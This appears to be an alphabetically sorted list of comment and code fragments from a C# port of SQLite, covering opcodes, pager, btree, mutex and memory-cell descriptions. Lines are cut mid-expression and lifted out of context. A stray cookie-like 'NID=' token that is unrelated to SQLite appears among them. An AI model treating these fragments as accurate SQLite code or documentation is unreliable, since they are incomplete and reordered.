 Maximum number of args passed to a user function. 
 Maximum number of entries in hash table before
 Maximum number of pages in one database file.
 Maximum page size.  The upper bound on this value is 32768.  This a limit
 Maximum size of zOut 
 Maximum string length 
 Maximum value 
 Maximum value of yyidx 
 Mcafee started using SQLite in their anti-virus product and it
 Measure the number of characters needed to output the given
 Mem address holding flag indicating that at least
 Mem address which causes query abort if positive 
 Mem v = new Mem()
 Mem.i contains count of 0s appended to blob 
 Mem.z points to a static string 
 Mem.z points to an agg function context 
 Mem.z points to an ephemeral string 
 MemPage.aCell[] of the entry.
 MemPage.aData elements if needed.
 Memory allocation function 
 Memory allocation functions used throughout sqlite.
 Memory cell pMem contains the context of an aggregate function.
 Memory cell that contains the rowid to delete 
 Memory cell to set to string value 
 Memory cell to write value into 
 Memory cell used for change counting 
 Memory cell used for the row counter 
 Memory cell used to implement LEFT OUTER JOIN 
 Memory cell used to store aggregate context 
 Memory cells are used as follows:
 Memory cells for cursors are allocated at the top of the address
 Memory is from sqlite3Malloc() 
 Memory location that acts as accumulator 
 Memory management strategy for zName 
 Memory register holding the rowid counter 
 Memory register used by AUTOINC 
 Memory registers holding LIMIT 
 Memory to hold the UTF-8 string is obtained from sqlite3Malloc and must
 Memory to hold the error message string is managed internally.
 Merge two lists of RowSetEntry objects.  Remove duplicates.
 Merge two lists of pages connected by pDirty and in pgno order.
 Meta values are as follows:
 Metadata is returned by writing to the memory locations passed as the 5th
 Methods for an open file 
 Methods for the module 
 Microsoft-style identifiers in [...] 
 Might happen if EMPTY_RESULT_CALLBACKS are on 
 Min and max heap requests sizes 
 Minimum amount of payload held locally 
 Minimum cell size is 4 
 Minimum file format for writable database files 
 Minimum local payload in a LEAFDATA table 
 Minimum local payload in non-LEAFDATA tables 
 Minimum number of pages reserved 
 Miscellaneous flags. See below 
 Modify the CREATE TABLE statement. 
 Modify the page-size after the cache has been created. 
 Modify the sqlite_master table to use the new table name. 
 Module destructor function 
 Module for cursor pVtabCursor 
 Module names must be registered before
 Most SQL statements are
 Most efficient plan seen so far 
 Most of the code in this file is taken up by the sqlite3VdbeExec()
 Most of the code in this file may be omitted by defining the
 Most of the effort here is involved in coalesing adjacent
 Most recent error code (SQLITE_
 Most recent error message 
 Most recent error message (UTF-16 encoded) 
 Most recent error message (UTF-8 encoded) 
 Most systems appear to do this simply by assigning
 Move a page here to make room for the root-page 
 Move data out of a btree key or data field and into a Mem structure.
 Move existing slots that come after the newly inserted slots
 Move page iDbPage from its current location to page number iFreePage 
 Move the cursor P1 to a null row.  Any OP_Column operations
 Move the cursor down to a new child page.  The newPgno argument is the
 Move the cursor down to the left-most leaf entry beneath the
 Move the cursor down to the right-most leaf entry beneath the
 Move the cursor so that it points to an entry near the key
 Move the cursor to point to the root page of its b-tree structure.
 Move the cursor to the first entry in the table.  Return SQLITE_OK
 Move the cursor to the last entry in the table.  Return SQLITE_OK
 Move the cursor up to the parent page.
 Move the date to the same time on the next occurrence of
 Move the open database page pDbPage to location iFreePage in the
 Move the page currently at pgnoRoot to pgnoMove. 
 Move the page pPg to location pgno in the file.
 Move the page to the head of the dirty list. 
 Move the values in register P1..P1
 Moving the lock from RESERVED to EXCLUSIVE actually involves going
 Multiple of these values can appear in Mem.flags.  But only one
 Multiply the value in register P1 by the value in register P2
 Must be element [1] 
 Must be element [2] 
 Must be element [3] 
 Must be first 
 Must be of the form  INSERT INTO ... SELECT ... 
 Must be so if pLimit==0 
 Must make sure nOverflow is reset to zero even if the balance()
 Mutex configuration options are only available in a threadsafe
 Mutex controlling the lock 
 Mutex to protect source database 
 Mutex to serialize access 
 Mutex type 
 Mutex used by sqlite3_initialize() 
 Mutex used to control access to shared lock 
 MutexAlloc() is called for a static mutex prior to initializing the
 Mutexes are created using [sqlite3_mutex_alloc()].
 N != 0 )
 N : z.Length ) )
 N == 0 )
 N > 0)
 N >= 0 )
 N >= p.nAlloc )
 N bytes: Master journal filename in utf-8.
 N should be a positive integer.
 N should be set to the expected maximum number of threads.  The sz
 NATURAL 
 NATURAL joins also create extra WHERE clause terms.
 NDEBUG 
 NEVER macros were defined at compile-time.
 NEVER( db.mallocFailed != 0 )
 NEVER( p.nCol < 1 ) ) return
 NEVER( p.nSrc == 0 ) )
 NEVER( pB.u.zToken == null ) ) return false
 NEVER( pEList == null ) ) return 1
 NEVER( pParse.nErr != 0 ) /
 NEVER( pSub1.pSrc == null ) 
 NEVER( pTab == null ) 
 NEVER( v == null ) /
 NEVER( z == null ) )
 NEVER(pCur.eState != CURSOR_VALID)
 NEW or OLD tables in a trigger.  Also used to hold the a single
 NID=204=DEIRBPT8FML_IsHGv1B2xxxxxxxxxxxxxxxxxxxSRlaNRV3-nfhFV8aHAgO6Smtf4JXQqR-W63p0KOVKgVd0VCXv4bKww97DEhc-PI1sVdbD4hGOuVwchN4Bwo-V61AtfjZM
 NN neighbors on either side.
 NO LONGER USED 
 NO-OP 
 NOT 
 NOT USED 
 NOT USED. Database lock protocol error 
 NOT USED. Table or record not found 
 NOTE:  These values must match the corresponding PAGER_ values in
 NOTE:  source files should 
 NOTE: These values must match the corresponding BTREE_ values in btree.h.
 NOTNULL 
 NULL 
 NULL            Function Name   
 NULL            NULL            
 NULL and pSelect is a pointer to the select statement used to generate
 NULL for tables.  Points to definition if a view. 
 NULL if the function does not exist.
 NULL is returned if the result column is an expression or constant or
 NULL is returned if there is an allocation error.
 NULL meaning that name is of the form Y.Z or Z.  Any available database
 NULL or constants 0 or 1 
 NULL or which have been previously closed.  If this routine returns
 NULL pBitvec tests 
 NULL pointer if [sqlite3_malloc()] is unable to allocate enough
 NULL pointer is returned.
 NULL t2 row will be inserted whenever t1.x!=5.  If we do not
 NULL-terminated version of pName 
 NULL.  These routine might also return NULL if a memory allocation error
 N] = new VdbeOp()
 Name assigned to this module 
 Name context for container 
 Name context for pParse.pNewTable 
 Name context for parent SELECT statement 
 Name context for processing aggregate information 
 Name context for resolving pE 
 Name context of this SELECT 
 Name context to resolve expressions in 
 Name of VFS module to use 
 Name of a table or index 
 Name of column in zTo.  If 0 use PRIMARY KEY 
 Name of database being accessed 
 Name of database file 
 Name of database file to open 
 Name of database holding pTab 
 Name of database holding this table 
 Name of database iDb 
 Name of database within pDestDb 
 Name of database within pSrcDb 
 Name of file to check 
 Name of file to delete 
 Name of file to delete when closing 
 Name of function 
 Name of master journal file if any 
 Name of new table or NULL 
 Name of savepoint 
 Name of table into which we are inserting 
 Name of table that the key points to 
 Name of the VFS to use 
 Name of the collating sequence 
 Name of the collating sequence for i-th index term 
 Name of the column 
 Name of the column of the table 
 Name of the column. 
 Name of the container - used for error messages 
 Name of the database 
 Name of the database containing pTable 
 Name of the database file 
 Name of the database file to open 
 Name of the database holding this table 
 Name of the database to use internally 
 Name of the database.  Might be NULL 
 Name of the file (UTF-8) 
 Name of the file containing the BTree database 
 Name of the function.  Not null-terminated 
 Name of the identifier 
 Name of the index 
 Name of the journal file 
 Name of the master database table.  The master database table
 Name of the module 
 Name of the module for the virtual table 
 Name of the other table 
 Name of the pragma 
 Name of the shared library containing extension 
 Name of the table 
 Name of the table into which we are inserting 
 Name of the table into which we insert 
 Name of the table or index to be reindexed 
 Name of the table or view 
 Name of the table to add to the FROM clause 
 Name of the table to be locked 
 Name of the table to be updated 
 Name of the table we are looking for 
 Name of the trigger 
 Name of this column 
 Name of this index 
 Name of this virtual file system 
 Name of trigger 
 Name of variables 
 Name passed to create_module() 
 Name to be added 
 Name we are searching for 
 NameContext in the parent query.  Thus the process of scanning the
 NameContext list corresponds to searching through successively outer
 Names are case sensitive.
 Names are zero-terminated UTF-8 strings.
 Names of result columns 
 Namespace to resolve expressions in. 
 Naming context 
 Need to //sqlite3DbFree() Expr.zToken 
 Need to call sqliteFree() on Mem.z 
 Need to free the WhereTerm.u.pAndInfo obj 
 Need to free the WhereTerm.u.pOrInfo object 
 Need to read this page properly. It contains some of the
 Needed for the definition of va_list 
 Needed for various definitions... 
 Needed to enable pthread recursive mutexes 
 Neither of these two scenarios are possible during a savepoint rollback.
 Neither side of the comparison is a column.  Compare the
 Nesting level 
 Nesting should only be of limited depth 
 Never called with prior errors 
 Never occurs on an ORDER BY query 
 New Pager.aSavepoint array 
 New VFSes are registered with sqlite3_vfs_register().
 New VFSes can be registered and existing VFSes can be unregistered.
 New cell becomes the i-th cell of the page 
 New chunk is required to extend the file. 
 New configuration options may be added in future releases of SQLite.
 New data for the row 
 New element added to the pH 
 New error codes may be added in future versions of SQLite.
 New fields may be appended in figure versions.  The iVersion
 New run-time limit categories may be added in future releases.
 New slots are zeroed.
 New status parameters may be added from time to time.
 New value for pMem->flags 
 New value for pMem->n 
 New verbs are likely to be added in future releases of SQLite.
 Newly allocated page 
 Next Free Header 
 Next and previous elements in the table 
 Next are the tables used to determine what action to take based on the
 Next backup associated with source pager 
 Next buffer in the list of free buffers 
 Next character in the format string 
 Next chunk in the journal 
 Next chunk on list of them all 
 Next divider slot in pParent.aCell[] 
 Next element in list of dirty pages 
 Next entry of the cache to replace 
 Next foreign key in pFrom 
 Next free slot 
 Next free slow in _query_plan[] 
 Next function with same name 
 Next in BtShared.pLock list 
 Next in LRU list of unpinned pages 
 Next in hash table chain 
 Next in linked list (see above) 
 Next in list of all blocked connections 
 Next in the link-list 
 Next info block in a list of them all 
 Next on a list of sharable BtShared structs 
 Next on the Parse.pZombieTab list 
 Next outer name context.  NULL for outermost 
 Next registered VFS 
 Next rowid cache.  0 means not valid 
 Next select to the left in a compound 
 Next trigger associated with the table 
 Next trigger down on the trigger stack 
 Next with a different name but the same hash 
 No DISTINCT keyword and no aggregate functions 
 No INSERTs may occurs after a SMALLEST.  An assertion will fail if
 No LIMIT means no OFFSET 
 No candidate table
 No changes are made if mxPage is 0 or negative.
 No checking is done to make sure that page iTable really is the
 No collation sequence of this type for this encoding is registered.
 No commit or rollback needed if the program never started 
 No encoding change 
 No key specified.  Use the key from the main database 
 No longer used 
 No memory allocation is ever used on mem1. 
 No other flags may be set in this case.
 No overflow pages. Return without doing anything 
 No way this can happen 
 No-op 
 No-op if we do not support a codec 
 No-op routine for the parse-tree walker.
 No-op versions of all memory allocation routines
 Non-recursive mutex required to access this struct 
 Non-zero if this is a v-tab with an xRename() 
 None.
 Normal (non-error) return. 
 Normalize realvalue to within 10.0 > realvalue >= 1.0 
 Normally sqlite3SelectExpand() will be called first and will have
 Not a compound SELECT 
 Not allowed on leftward elements 
 Not currently enforced.
 Not currently used 
 Not everything is nestable.  This facility is designed to permit
 Not supplying an error message will have no adverse effect
 Not used 
 Not used on win32 
 NotFound assumes key is a blob constructed from MakeRecord and
 Note also that the numeric types are grouped together so that testing
 Note if Token.z==0 then Token.dyn and Token.n are undefined and
 Note that RowKey and RowData are really exactly the same instruction 
 Note that SQLite comes with a built-in memory allocator that is
 Note that [sqlite3_prepare_v2()] and [sqlite3_step()] both modify their
 Note that a side-effect of the CREATE TABLE statement is to leave
 Note that if one of the dynamic mutex parameters (SQLITE_MUTEX_FAST
 Note that indices have pIdx.nColumn regular columns plus
 Note that it is possible for the library compile-time options to
 Note that pCell does not necessary need to point to the pPage.aData
 Note that the SQLITE_TEXT constant was also used in SQLite version 2
 Note that the authorizer callback is invoked only during
 Note that the call to sqlite3ResultSetOfSelect() will expand any
 Note that the database name is not the filename that contains
 Note that the expression in the result set should have already been
 Note that the loops might not be nested in the order in which they
 Note that the mapping is not necessarily ordered.  In the example
 Note that the order in which automatic variables are declared below
 Note that the trunk page is not really full until it contains
 Note that the values returned are one less that the values that
 Note that windows does not allow a file to be deleted if some other
 Note: Maybe MemRelease() should be called if sqlite3SafetyOn()
 Note: The 
 Note: This block also runs if one of the special errors handled
 Note: the calls to BtreeKeyFetch() and DataFetch() below assert()
 Notes On Invalid UTF-8:
 Notes on UTF-16:  (with wwww
 Notes on UTF-8:
 Nothing in this file or anywhere else in SQLite does any kind of
 Nothing to do 
 Notify of page size changes 
 Now begin substituting subquery result set expressions for
 Now manipulate the actual database free-list structure. There are two
 Now search pTab for the exact column. 
 Nul-terminated UTF-8 string <id> 
 Null-terminated column definition 
 Num. bytes allocated for WhereInfo struct 
 Number bytes in cell content header 
 Number of '
 Number of 100-nanosecond intervals in a single day 
 Number of 100-nanosecond intervals in half of a day 
 Number of == constraints 
 Number of == or IN constraints 
 Number of COLNAME_xxx symbols 
 Number of Debug.Assigned cursor values 
 Number of Journal Records 
 Number of ORDER BY terms 
 Number of PtrMap pages to be freed 
 Number of Records in the journal 
 Number of UTF-8 characters in zTabName 
 Number of VDBEs currently executing 
 Number of aTempReg[] currently checked out 
 Number of active VDBEs that are writing 
 Number of aliased result set columns 
 Number of allocated slots for aAlias[] 
 Number of allocated slots in apVarExpr[] 
 Number of arguments 
 Number of arguments to the function 
 Number of arguments to the module 
 Number of arguments.  -1 means any number 
 Number of arguments.  -1 means unlimited 
 Number of backends currently in use 
 Number of backup operations reading this btree 
 Number of bits handled by each apSub[] entry. 
 Number of bits in the bitmap array. 
 Number of bits that are set - only valid for aHash
 Number of buckets in the hash table 
 Number of buffers currently checked out 
 Number of bytes available on the local btree page 
 Number of bytes in a page 
 Number of bytes in a varint 
 Number of bytes in header 
 Number of bytes in input 
 Number of bytes in pData 
 Number of bytes in the record 
 Number of bytes in zFunc 
 Number of bytes in zPathname 
 Number of bytes of available data 
 Number of bytes of cell payload 
 Number of bytes of data 
 Number of bytes of data space 
 Number of bytes of data to be bound 
 Number of bytes of header space 
 Number of bytes to allocate 
 Number of bytes to copy 
 Number of bytes to read 
 Number of bytes to return. 
 Number of bytes to write 
 Number of cells in apCell[] 
 Number of cells in page pPage 
 Number of cells on the page 
 Number of characters in function name 
 Number of characters in the name 
 Number of characters in this token 
 Number of characters in zCharSet 
 Number of characters in zName 
 Number of children that must disable us 
 Number of columns 
 Number of columns in one row of the result set 
 Number of columns in result set 
 Number of columns in the data 
 Number of columns in the index 
 Number of columns in the result set 
 Number of columns in the sorting index 
 Number of columns in the source table 
 Number of columns in the table used by this index 
 Number of columns in this key 
 Number of columns in this table 
 Number of columns must be the same in tab1 and tab2 
 Number of columns of data 
 Number of columns that show through to the output.
 Number of compound terms processed so far 
 Number of constraint terms 
 Number of cursors to allocate 
 Number of databases with an active write-transaction 
 Number of days since 1st day of year 
 Number of db changes made since last reset 
 Number of elements 
 Number of elements in a bitmap array. 
 Number of elements in aSavepoint[] 
 Number of elements left to test 
 Number of elements summed 
 Number of enterances 
 Number of entries allocated below 
 Number of entries allocated for a[] below 
 Number of entries allocated for apAux[] 
 Number of entries allocated in a[] below 
 Number of entries in a hash table
 Number of entries in aArg[] 
 Number of entries in aColl[] 
 Number of entries in aConstraint 
 Number of entries in aExt[] 
 Number of entries in aFunc[] 
 Number of entries in aInLoop[] 
 Number of entries in aRoot[] 
 Number of entries in aVar[] 
 Number of entries in a[] 
 Number of entries in apMem[] 
 Number of entries in the column cache 
 Number of entries in this table 
 Number of entries on one ptrmap page 
 Number of entries with this hash 
 Number of entries without a matching leave 
 Number of equality look-ups needed 
 Number of errors encountered 
 Number of errors encountered while resolving names 
 Number of errors reported 
 Number of errors seen 
 Number of expressions on the list 
 Number of extra 0 bytes to append to data 
 Number of extra registers needed 
 Number of extra registers to allocate 
 Number of fields in the header 
 Number of fields in the record 
 Number of fields in the table or index 
 Number of fragmented bytes on pPage 
 Number of free bytes on the page 
 Number of free pages for scratch and page-cache memory 
 Number of full pages read from DB 
 Number of full pages written to DB 
 Number of function arguments 
 Number of hidden columns if TABLE is virtual 
 Number of identifiers on the list 
 Number of index columns with == constraints 
 Number of indices that need updating 
 Number of instructions in the program 
 Number of labels used 
 Number of leaves on the trunk of the freelist 
 Number of loaded extensions 
 Number of locks in aTableLock 
 Number of matching column names 
 Number of matching table names 
 Number of memory cells to allocate 
 Number of memory cells used so far 
 Number of memory locations currently allocated 
 Number of messages written to zErrMsg so far 
 Number of names resolved by this context 
 Number of neighbors on either side of pPage 
 Number of nested calls to sqlite3BtreeEnter() 
 Number of nested calls to the parser/code generator 
 Number of nested loop 
 Number of nested statement-transactions  
 Number of new slots to add to pSrc.a[] 
 Number of non-benign errors 
 Number of non-transaction savepoints 
 Number of non-wildcard prefix characters 
 Number of objects currently in use 
 Number of objects on pFresh 
 Number of opcodes for progress callback 
 Number of open transactions (read 
 Number of overflow cell bodies in aCell[] 
 Number of pages in apNew[] 
 Number of pages in apOld[] 
 Number of pages in database after autovacuuming 
 Number of pages in pPage[] 
 Number of pages in the LRU list 
 Number of pages in the database 
 Number of pages in the database file 
 Number of pages left to copy 
 Number of pages on the freelist 
 Number of pages on the freelist initially 
 Number of pages starting at pg1 to journal 
 Number of pages still on the free-list 
 Number of pages to use in the cache 
 Number of pages written to journal 
 Number of pointers to this Table 
 Number of pointers to this structure 
 Number of previously allocated VDBE cursors 
 Number of purgeable pages allocated 
 Number of reader locks obtained 
 Number of records written to sub-journal 
 Number of referenced pages 
 Number of references to this structure 
 Number of registers allocated 
 Number of registers left to copy 
 Number of registers to allocate 
 Number of remaining savepoints after this op. 
 Number of result columns 
 Number of result columns returned by SELECT 
 Number of result columns written here 
 Number of result rows written here 
 Number of retry attempts 
 Number of right-hand side symbols in the rule 
 Number of scratch buffers 
 Number of sets used so far 
 Number of significant digits returned 
 Number of slots allocated for aCol[] 
 Number of slots allocated for aFunc[] 
 Number of slots allocated for aOp[] 
 Number of slots allocated in aLabel[] 
 Number of slots in apCsr[] 
 Number of slots in apHash[] 
 Number of tables in the database 
 Number of tables or subqueries in the FROM clause 
 Number of tables to check.  (Number of root pages.) 
 Number of temporary registers in aTempReg[] 
 Number of terms 
 Number of terms in subquery FROM clause 
 Number of terms in the ORDER BY clause 
 Number of terms in the result set 
 Number of the page to fetch 
 Number of the page to get 
 Number of the rule by which to reduce 
 Number of times each page is referenced 
 Number of times table has been busy 
 Number of times this instruction was executed 
 Number of u32 values in hash table. 
 Number of unused bytes at end of each page 
 Number of unused bytes on the page 
 Number of usable bytes on a page 
 Number of usable bytes on each page 
 Number of used entries in aCol[] 
 Number of used slots in apVarExpr[] 
 Number of users of pInitMutex 
 Number of users of this page 
 Number of values left to copy 
 Number of virtual tables to lock 
 Number of zero bytes at the end of the record 
 Number used to identify the index 
 OBSOLETE COMMENT 1:
 OBSOLETE COMMENT 2:
 OE_Ignore.  This is necessary for the correct constraint check
 OE_Rollback etc. 
 OF 
 OFFSET 
 OFFSET clauses and joins them to the left-hand-side of the original
 OFFSET counters 
 OFFSET expression. NULL means not used. 
 OFFSET implies LIMIT 
 OFFSET value.  NULL means no offset 
 OK to update SQLITE_MASTER 
 ON 
 ON CONFLICT REPLACE] clause.  Nor is the update hook
 ON CONFLICT policy 
 ON and USING clauses are converted into extra terms of the WHERE clause.
 ON clause terms may not be used with an index
 OPFLAG_APPEND )
 OPFLAG_APPEND ) != 0
 OPFLAG_ISUPDATE ) != 0 
 OPFLAG_ISUPDATE : OPFLAG_LASTROWID )
 OPFLAG_LASTROWID 
 OPFLAG_LASTROWID ) != 0 ) db.lastRowid = pKey.u.i
 OPFLAG_NCHANGE ) != 0 ) p.nChange
 OPFLAG_USESEEKRESULT ) != 0 
 OPFLG_IN1 ) != 0 )
 OPFLG_IN2 ) != 0 )
 OPFLG_IN3 ) != 0 )
 OPFLG_OUT2_PRERELEASE ) != 0 )
 OPFLG_OUT3 ) != 0 )
 OP_Column on the same table without any intervening operations that
 OP_Column opcode.
 OP_Count instruction is executed either on the intkey table that
 OP_Destroy 4 0
 OP_Destroy 5 0
 OP_Destroy stores an in integer r1. If this integer
 OP_IsUnique opcode on this cursor. 
 OP_Le : OP_Ge
 OP_Lt : OP_Gt
 OP_OpenEphem opcodes related to this select 
 OP_OpenEphemeral instruction will be changed to an OP_Noop once
 OP_OpenRead or OP_OpenWrite 
 OP_OpenWrite : OP_OpenRead
 OP_Pagecount is always called from within a read transaction.  The
 OP_Prev : OP_Next )
 OP_Rewind/Op_Next with no intervening instructions that might invalidate
 OP_SCopy instruction to move the value into the correct register
 OP_Savepoint instruction.
 OP_ToText
 OP_VColumn : OP_Column
 OR 
 OR using multiple indices 
 OR-ed combination of these values can be used when searching for
 ORDER 
 ORDER BY CLAUSE PROCESSING
 ORDER BY clause already exists.
 ORDER BY clause for index to optimize 
 ORDER BY in this case since the order of entries in the set
 ORDER BY of a compound SELECT.  The expression has not been
 ORDER BY processing for max() func 
 ORDER BY processing for min() func 
 ORDER BY term is not an integer index into the result set.  That
 ORDER BY terms that are already an integer between 1 and N are
 OS Interface 
 OS functions to use for IO 
 OS2_HIGH_MEMORY)
 OSMinor >= 2)
 OTHERWISE:
 OUT: A pointer to the prepared statement 
 OUT: End of parsed string 
 OUT: Global maximum cache size 
 OUT: Mask of TRIGGER_BEFORE
 OUT: Mask of columns used from the NEW.
 OUT: Mask of columns used from the OLD.
 OUT: MemPage handle (may be NULL) 
 OUT: Next overflow page number 
 OUT: Pointer to unused portion of zSql 
 OUT: Result 
 OUT: Return data in this Mem structure. 
 OUT: Return the Pager structure here 
 OUT: Returned database handle 
 OUT: SQLite db handle 
 OUT: Set to true if constraint may cause a replace 
 OUT: Statement handle 
 OUT: Sum of PCache1.nMin for purgeable caches 
 OUT: Total number of pages available for recycling 
 OUT: Total number of pages cached 
 OUT: Value of original database size field 
 OUT: Value read from the nRec field 
 OUTER 
 OUTER JOINS
 OUTPUT: Collation sequence name 
 OUTPUT: Declared data type 
 OUTPUT: True if NOT NULL constraint exists 
 OUTPUT: True if column is auto-increment 
 OUTPUT: True if column part of PK 
 OUTPUTS:
 Object being parsed at the point of error 
 Object used to lock page 1 
 Objects are rarely larger than 2MiB limit of a 3-byte varint.
 Objects of this type are created by [sqlite3_blob_open()]
 Obscure case for non-leaf-data trees: If the cell at pCell was
 Obtain a RESERVED lock on the database file. If the exFlag parameter
 Obtain a lock on a particular table. This instruction is only used when
 Obtain a lock on the table whose root page is iTab.  The
 Obtain the STATIC_MASTER mutex.
 Obtain the page at pgnoRoot 
 Obtain the page from this cache 
 Offset from start of page to first cell pointer 
 Offset from the beginning of the file 
 Offset from the start of data to return bytes from. 
 Offset in CREATE TABLE stmt to add a new column 
 Offset in pointer map page 
 Offset into Buffer 
 Offset into aDigits[] of the digits string 
 Offset into aKey[] of next data element 
 Offset into aKey[] of next header element 
 Offset into aPrefix[] of the prefix string 
 Offset into buffer 
 Offset into page data 
 Offset into the data 
 Offset into the file to begin writing at 
 Offset of entry in pointer map 
 Offset of first byte after cell pointer array 
 Offset of header in journal file 
 Offset of header on pPage 
 Offset of journal header being read 
 Offset of record to playback 
 Offset to beginning of page header 
 Offset to cell content of cell being deleted 
 Offset to overflow page number.  Zero if no overflow 
 Offset to start of cell content -- Needed for C
 Offset to the cell content area 
 Offset to the cell pointer array 
 Offset to the page header 
 Offset to write 
 Offset] != b[i] ) return ( a[i 
 Offset] < b[i] ) 
 Ok for sqlite3_open_v2() 
 Ok to return a row more than once 
 Ok to use one-pass algorithm for UPDATE or DELETE 
 Older versions of SQLite used an optional THREADSAFE macro.
 Omit children but continue walking siblings 
 Omit close of table 
 Omit error if index already exists 
 Omit readlocks on readonly files 
 Omit this entire file if SQLITE_ENABLE_UNLOCK_NOTIFY is not defined. 
 On of the PAGER_JOURNALMODE_
 One (or both) of the named databases did not exist. An error has
 One bit for each page in the database file 
 One can use this text in an SQL statement as follows:
 One character in z[] 
 One character past the end of input text 
 One column in the result set 
 One element of this array for each open cursor 
 One entry for each expression 
 One entry for each identifier on the list 
 One entry for each of nCol column s 
 One extra bucket is added to catch overflow in case something
 One for each valid column cache entry 
 One is tempted to try to add a and b to combine the limits.  But this
 One may expect the number of extended result codes will be expand
 One of SYNC_NORMAL or SYNC_FULL 
 One of several kinds of errors 
 One of the COLNAME_
 One of the CURSOR_XXX constants (see below) 
 One of the P4_xxx constants for p4 
 One of the SQLITE_AFF_... values 
 One of the SQLITE_COLL_... values below 
 One of the SRT_ operations to apply to self 
 One of the WHERE_
 One of the following two instructions is replaced by an OP_Noop. 
 One of the journals pointed to by the master journal exists.
 One of: TK_UNION TK_ALL TK_INTERSECT TK_EXCEPT 
 One or both of the subtrees can be NULL.  Return a pointer to the new
 One or more of FLAG_ constants below 
 One or more of the following flags are set to indicate the validOK
 One or more tables used to resolve names 
 One or the other of the two processes must give way or there can be
 One register allocated to each index 
 One register assigned to each index to be updated 
 One release per successful fetch.  Page is pinned until released.
 One slot for each function argument 
 One way around this problem is to check the extended error code returned
 One-time test address 
 Only a single authorizer can be in place on a database connection
 Only allow tracing if SQLITE_DEBUG is defined.
 Only attempt the conversion to TEXT if there is an integer or real
 Only change the value of sqlite.enc if the database handle is not
 Only clean and unpinned pages can be reclaimed.
 Only constant expressions are appropriate for factoring 
 Only delete if aRegIdx!=0 
 Only if pLimit!=0 or pOffset!=0 do the limit registers get
 Only mark the value as an integer if
 Only one flag value allowed 
 Only positive rowid values are considered valid for this cache.
 Only pure zero-filled BLOBs can be input to this Opcode.
 Only the following combinations are supported.  Anything different
 Opcode 
 Opcode 5 is used to deliberately induce a fault in order to
 Opcode and P5 of the opcode that ends the loop 
 Opcode:  Gosub P1 P2 
 Opcode:  Goto 
 Opcode:  Halt P1 P2 
 Opcode:  HaltIfNull  P1 P2 P3 P4 
 Opcode:  Return P1 
 Opcode:  Yield P1 
 Opcode: Add P1 P2 P3 
 Opcode: AddImm  P1 P2 
 Opcode: Affinity P1 P2 
 Opcode: AggFinal P1 P2 
 Opcode: AggStep 
 Opcode: And P1 P2 P3 
 Opcode: AutoCommit P1 P2 
 Opcode: BitAnd P1 P2 P3 
 Opcode: BitNot P1 P2 
 Opcode: BitOr P1 P2 P3 
 Opcode: Blob P1 P2 
 Opcode: Clear P1 P2 P3
 Opcode: Close P1 
 Opcode: CollSeq 
 Opcode: Column P1 P2 P3 P4 
 Opcode: Compare P1 P2 P3 P4 
 Opcode: Concat P1 P2 P3 
 Opcode: ContextPop 
 Opcode: ContextPush 
 Opcode: Copy P1 P2 
 Opcode: Count P1 P2 
 Opcode: CreateIndex P1 P2 
 Opcode: CreateTable P1 P2 
 Opcode: Delete P1 P2 
 Opcode: Destroy P1 P2 P3 
 Opcode: Divide P1 P2 P3 
 Opcode: DropIndex P1 
 Opcode: DropTable P1 
 Opcode: DropTrigger P1 
 Opcode: Eq P1 P2 P3 P4 P5
 Opcode: Expire P1 
 Opcode: Found P1 P2 P3 
 Opcode: Function P1 P2 P3 P4 P5
 Opcode: Ge P1 P2 P3 P4 P5
 Opcode: Gt P1 P2 P3 P4 P5
 Opcode: IdxDelete P1 P2 P3 
 Opcode: IdxGE P1 P2 P3 P4 P5
 Opcode: IdxInsert P1 P2 P3 
 Opcode: IdxLT P1 P2 P3 
 Opcode: IdxRowid P1 P2 
 Opcode: If P1 P2 P3 
 Opcode: IfNeg P1 P2 
 Opcode: IfNot P1 P2 P3 
 Opcode: IfPos P1 P2 
 Opcode: IfZero P1 P2 
 Opcode: IncrVacuum P1 P2 
 Opcode: Insert P1 P2 P3 P4 P5
 Opcode: Int64 
 Opcode: Integer P1 P2 
 Opcode: IntegrityCk P1 P2 P3 
 Opcode: IsNull P1 P2 
 Opcode: IsUnique P1 P2 P3 P4 
 Opcode: Jump P1 P2 P3 
 Opcode: Last P1 P2 
 Opcode: Le P1 P2 P3 P4 P5
 Opcode: LoadAnalysis P1 
 Opcode: Lt P1 P2 P3 P4 P5
 Opcode: MakeRecord P1 P2 P3 P4 
 Opcode: MemMax P1 P2 
 Opcode: Move P1 P2 P3 
 Opcode: Multiply P1 P2 P3 
 Opcode: MustBeInt P1 P2 
 Opcode: Ne P1 P2 P3 P4 P5
 Opcode: NewRowid P1 P2 P3 
 Opcode: Next P1 P2 
 Opcode: Noop 
 Opcode: Not P1 P2 
 Opcode: NotExists P1 P2 P3 
 Opcode: NotFound P1 P2 P3 
 Opcode: NotNull P1 P2 
 Opcode: Null 
 Opcode: NullRow P1 
 Opcode: OpenEphemeral P1 P2 
 Opcode: OpenPseudo P1 P2 P3 
 Opcode: OpenRead P1 P2 P3 P4 P5
 Opcode: OpenWrite P1 P2 P3 P4 P5
 Opcode: Or P1 P2 P3 
 Opcode: Pagecount P1 P2 
 Opcode: ParseSchema P1 P2 
 Opcode: Permutation 
 Opcode: Prev P1 P2 
 Opcode: ReadCookie P1 P2 P3 
 Opcode: Real 
 Opcode: RealAffinity P1 
 Opcode: Remainder P1 P2 P3 
 Opcode: ResetCount P1 
 Opcode: ResultRow P1 P2 
 Opcode: Rewind P1 P2 
 Opcode: RowData P1 P2 
 Opcode: RowKey P1 P2 
 Opcode: RowSetAdd P1 P2 
 Opcode: RowSetRead P1 P2 P3 
 Opcode: RowSetTest P1 P2 P3 P4
 Opcode: Rowid P1 P2 
 Opcode: SCopy P1 P2 
 Opcode: Savepoint P1 
 Opcode: Seek P1 P2 
 Opcode: SeekGe P1 P2 P3 P4 
 Opcode: SeekGt P1 P2 P3 P4 
 Opcode: SeekLe P1 P2 P3 P4 
 Opcode: SeekLt P1 P2 P3 P4 
 Opcode: Sequence P1 P2 
 Opcode: SetCookie P1 P2 P3 
 Opcode: SetNumColumns 
 Opcode: ShiftLeft P1 P2 P3 
 Opcode: ShiftRight P1 P2 P3 
 Opcode: Sort P1 P2 
 Opcode: Statement P1 
 Opcode: String P1 P2 
 Opcode: String8 
 Opcode: Subtract P1 P2 P3 
 Opcode: TableLock P1 P2 P3 P4 
 Opcode: ToBlob P1 
 Opcode: ToInt P1 
 Opcode: ToNumeric P1 
 Opcode: ToReal P1 
 Opcode: ToText P1 
 Opcode: Trace 
 Opcode: Transaction P1 P2 
 Opcode: VBegin 
 Opcode: VColumn P1 P2 P3 
 Opcode: VCreate P1 
 Opcode: VDestroy P1 
 Opcode: VFilter P1 P2 P3 P4 
